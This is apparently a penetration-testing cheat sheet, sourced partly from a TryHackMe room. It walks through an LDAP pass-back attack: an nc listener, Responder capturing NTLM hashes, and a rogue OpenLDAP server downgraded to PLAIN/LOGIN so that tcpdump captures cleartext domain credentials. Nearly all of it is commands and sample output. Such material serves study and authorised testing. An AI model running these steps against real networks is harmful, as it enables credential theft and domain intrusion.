# LDAP Pass-back

- [LDAP Pass-back](#ldap-pass-back)
	- [Basic with nc](#basic-with-nc)
	- [Responder](#responder)
	- [Rogue LDAP Server](#rogue-ldap-server)
		- [Capturing LDAP Credentials](#capturing-ldap-credentials)
	- [Source](#source)

## Basic with nc

`sudo nc -lvp 389`

```raw
Connection from IP_ADDRESS:49786
0�Dc�;

x�
  objectclass0�supportedCapabilities
```

The string `supportedCapabilities` indicate that the targeted server is trying to negotiate the LDAP authentication method details. Therefore, the best is to setup a `Rogue LDAP Server` or to use `Responder`.

## Responder

`sudo responder -I tun0`

```raw
[LDAP] NTLMv1-SSP Client   : ::ffff:IP_ADDRESS
[LDAP] NTLMv1-SSP Username : DOMAIN\USERNAME
[LDAP] NTLMv1-SSP Hash     : USERNAME::DOMAIN:Hash_PART:Hash_PART:CHALLENGE
```

## Rogue LDAP Server

> Install server

```sh
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

> Configuration

```sh
sudo dpkg-reconfigure -p low slapd

Set DNS domain name:

Has the domain name server of the target
```

> Check supported authentication mechanisms

`ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`

```raw
dn:
supportedSASLMechanisms: DIGEST-MD5
supportedSASLMechanisms: CRAM-MD5
supportedSASLMechanisms: NTLM
```

> Change supported authentication mechanisms

`nano olcSaslSecProps.ldif`

```text
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

```raw
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
sudo systemctl restart slapd
```

> Verify supported authentication mechanisms

`ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`

```raw
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

### Capturing LDAP Credentials

> Install tcpdump

`sudo apt install tcpdump`

> Sniff packets

`sudo tcpdump -SX -i eth0 tcp port 389`

```raw
10:41:52.979933 IP TARGET_IP.49834 > SERVER_IP.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76
	0x0000:  4500 0074 b08c 4000 8006 20e2 0a0a 0ac9  E..t..@.........
	0x0010:  0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2  ...9........BW..
	0x0020:  5018 2014 1382 0000 3084 0000 0046 0201  P.......0....F..
	0x0030:  0263 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
	0x0070:  6973 6d73                                isms
10:41:52.979938 IP SERVER_IP.ldap > TARGET_IP.49834: Flags [.], ack 4245946151, win 502, length 0
	0x0000:  4500 0028 247d 4000 4006 ed3d 0a0a 0a39  E..($}@.@..=...9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5010 01f6 2930 0000                      P...)0..
10:41:52.980162 IP SERVER_IP.ldap > TARGET_IP.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54
	0x0000:  4500 005e 247e 4000 4006 ed06 0a0a 0a39  E..^$~@.@......9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5018 01f6 2966 0000 3034 0201 0264 2f04  P...)f..04...d/.
	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
	0x0050:  0405 504c 4149 4e04 054c 4f47 494e       ..PLAIN..LOGIN
[....]
10:41:52.987145 IP TARGET_IP.49835 > SERVER_IP.ldap: Flags [.], ack 3088612909, win 8212, length 0
	0x0000:  4500 0028 b092 4000 8006 2128 0a0a 0ac9  E..(..@...!(....
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5010 2014 0ae4 0000 0000 0000 0000       P.............
10:41:52.989165 IP TARGET_IP.49835 > SERVER_IP.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65
	0x0000:  4500 0069 b093 4000 8006 20e6 0a0a 0ac9  E..i..@.........
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5018 2014 3afe 0000 3084 0000 003b 0201  P...:...0....;..
	0x0030:  0560 8400 0000 3202 0102 0418 7a61 2eX  .`....2.....za.t
	0x0040:  xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  DOMAIN\USER
	0x0050:  xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  NAME..PASSWORD
```

## Source

- <https://tryhackme.com/room/breachingad>
- <https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210>